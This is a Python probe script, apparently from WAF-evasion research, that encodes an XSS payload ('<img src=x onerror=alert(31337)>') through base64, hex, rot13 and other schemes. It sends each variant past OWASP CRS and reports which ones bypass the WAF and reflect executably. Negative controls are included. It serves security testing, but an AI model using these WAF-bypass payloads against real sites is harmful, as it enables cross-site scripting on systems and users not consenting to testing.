#!/usr/bin/env python3
"""App-transform probe: can an executable XSS payload reach the origin past CRS
when the application runs an attacker-controllable DECODER over the value first?

CRS normalises the encodings it knows (URL, HTML-entity, JS, CSS) with its own
transforms before matching, and 403s double-URL-encoding outright. It cannot,
however, reverse an arbitrary APP-side decoder it has no transform for. This
probe encodes one executable payload through each app-transform the origin
models and fires it via GET (the collection CRS inspects most thoroughly), then
reports whether CRS passed it (200) and whether the DECODED payload reflected
raw (executable).

  b64 / hex / rot13  — genuinely WAF-opaque: CRS has no matching transform.
  jsesc / entity     — NEGATIVE CONTROLS: CRS's jsDecode / htmlEntityDecode see
                       through them, so they should stay blocked.
  dd                 — double-URL: CRS 403s it (920240/920250). Control.
  body               — raw payload, no transform: CRS blocks it. Control.
"""
import argparse
import base64
import codecs
import http.client
import sys
import urllib.parse
from urllib.parse import urlsplit

MARK = "31337"
PAYLOAD = f"<img src=x onerror=alert({MARK})>"


def enc_b64(p):
    return base64.b64encode(p.encode()).decode()


def enc_hex(p):
    return p.encode().hex()


def enc_rot13(p):
    return codecs.encode(p, "rot13")


def enc_jsesc(p):
    return "".join(f"\\u{ord(c):04x}" for c in p)


def enc_entity(p):
    return "".join(f"&#{ord(c)};" for c in p)


def enc_dd(p):
    # double-URL-encode: percent-encode once, then percent-encode the percents.
    once = urllib.parse.quote(p, safe="")
    return urllib.parse.quote(once, safe="")


def enc_raw(p):
    return p


ENCODERS = {
    "b64": enc_b64,
    "hex": enc_hex,
    "rot13": enc_rot13,
    "jsesc": enc_jsesc,
    "entity": enc_entity,
    "dd": enc_dd,
    "body": enc_raw,
}


def fire(base, ctx, encoded):
    u = urlsplit(base)
    conn = http.client.HTTPConnection(u.hostname or "127.0.0.1", u.port or 80, timeout=15)
    path = f"{u.path or '/'}?ctx={ctx}&q={urllib.parse.quote(encoded, safe='')}"
    # A real client (browser / the wafrift fire client) always sends a
    # User-Agent; omitting it trips CRS 920320 and adds anomaly score unrelated
    # to the payload, masking the true verdict. Send one so the probe measures
    # the PAYLOAD's fate, not a missing-header penalty.
    hdrs = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }
    try:
        conn.request("GET", path, headers=hdrs)
        resp = conn.getresponse()
        text = resp.read(65536).decode("utf-8", "replace")
        return resp.status, text
    except Exception as e:  # noqa: BLE001
        return -1, f"<wire-error: {e}>"
    finally:
        conn.close()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True)
    ap.add_argument("--pl", default="?")
    args = ap.parse_args()
    print(f"# transform probe base={args.base} PL={args.pl}", file=sys.stderr)
    print("pl\tctx\twaf_status\treflected_exec\tnote")
    for ctx, enc in ENCODERS.items():
        encoded = enc(PAYLOAD)
        status, text = fire(args.base, ctx, encoded)
        reflected = PAYLOAD in text
        if status == -1:
            note = text[:50]
        elif reflected:
            note = "BYPASS+EXECUTE"
        elif status == 403:
            note = "waf-403-blocked"
        elif status == 200:
            note = "200-inert(app-didnt-decode-or-waf-stripped)"
        else:
            note = f"status-{status}"
        print(f"{args.pl}\t{ctx}\t{status}\t{int(reflected)}\t{note}")


if __name__ == "__main__":
    raise SystemExit(main())
